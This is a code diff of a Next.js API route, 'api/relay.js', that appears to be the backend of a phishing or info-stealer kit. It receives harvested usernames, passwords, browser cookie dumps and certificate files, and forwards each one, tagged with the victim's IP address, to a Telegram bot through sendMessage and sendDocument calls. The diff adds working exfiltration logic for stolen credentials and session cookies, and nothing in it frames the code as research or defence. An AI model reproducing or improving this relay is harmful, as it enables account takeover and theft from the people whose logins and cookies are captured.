@@ -1,8 +1,8 @@
 // api/relay.js
-
 import nextConnect from 'next-connect';
 import multer from 'multer';
-import FormData from 'form-data';
+import FormData from 'form-data'; // Needed to send files to Telegram
+import { Blob } from 'buffer';
 
 export const config = {
   api: {
@@ -36,9 +36,9 @@ handler.post(async (req, res) => {
   try {
     const contentType = req.headers['content-type'] || '';
 
-    // Handle JSON payloads (creds, etc.)
+    // Handle JSON payloads (creds, cookies, etc.)
     if (contentType.includes('application/json')) {
-      // Parse JSON body manually since bodyParser is false
+      // Parse JSON body manually (since bodyParser is false)
       let body = '';
       await new Promise((resolve, reject) => {
         req.on('data', chunk => body += chunk);
@@ -49,7 +49,6 @@ handler.post(async (req, res) => {
       try {
         json = JSON.parse(body);
       } catch (err) {
-        console.error('JSON parse error:', err);
         return res.status(400).json({ success: false, message: 'Invalid JSON' });
       }
 
@@ -58,23 +57,87 @@ handler.post(async (req, res) => {
         ? data
         : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;
 
-      // If text contains 'Cookies found:', treat as file
+      // If text contains 'Cookies found:', send as file to Telegram
       if (text && text.startsWith('Cookies found:')) {
         const form = new FormData();
         form.append('chat_id', chatId);
+
         const fname = `${ip || 'cookie'}-COOKIE.txt`;
-        form.append('document', Buffer.from(text, 'utf-8'), {
-          filename: fname,
-          contentType: 'text/plain'
-        });
-        // Optional caption
+        // Use Buffer for file
+        form.append(
+          'document',
+          Buffer.from(text, 'utf-8'),
+          { filename: fname, contentType: 'text/plain' }
+        );
+
         let caption = ip ? `IP: ${ip}\n` : '';
         if (type) caption += `Type: ${type}\n`;
-        if (caption) form.append('caption', caption);
+        if (caption.length) form.append('caption', caption);
 
         const tgRes = await fetch(`${botUrl}/sendDocument`, {
           method: 'POST',
           body: form,
           headers: form.getHeaders()
         });
-        const tgText = aw
+        const tgText = await tgRes.text();
+        if (!tgRes.ok) {
+          console.error('Telegram API error (file):', tgText);
+          return res.status(502).json({ success: false, error: tgText });
+        }
+        return res.status(200).json({ success: true });
+      } else {
+        // Otherwise, send as plain text message
+        const tgRes = await fetch(`${botUrl}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text
+          })
+        });
+        const tgText = await tgRes.text();
+        if (!tgRes.ok) {
+          console.error('Telegram API error (text):', tgText);
+          return res.status(502).json({ success: false, error: tgText });
+        }
+        return res.status(200).json({ success: true });
+      }
+    }
+
+    // Handle file uploads (cookies/certs direct)
+    if (req.file) {
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append(
+        'document',
+        new Blob([req.file.buffer], { type: 'text/plain' }),
+        req.file.originalname
+      );
+      const { ip, type } = req.body;
+      let caption = '';
+      if (ip) caption += `IP: ${ip}\n`;
+      if (type) caption += `Type: ${type}\n`;
+      if (caption.length) form.append('caption', caption);
+
+      const tgRes = await fetch(`${botUrl}/sendDocument`, {
+        method: 'POST',
+        body: form,
+        headers: form.getHeaders()
+      });
+      const tgText = await tgRes.text();
+      if (!tgRes.ok) {
+        console.error('Telegram API error (upload):', tgText);
+        return res.status(502).json({ success: false, error: tgText });
+      }
+      return res.status(200).json({ success: true });
+    }
+
+    // ❌ Unexpected payload
+    res.status(400).json({ success: false, message: 'Bad payload' });
+  } catch (err) {
+    console.error('Telegram API error:', err);
+    res.status(502).json({ success: false, error: String(err) });
+  }
+});
+
+export default handler;
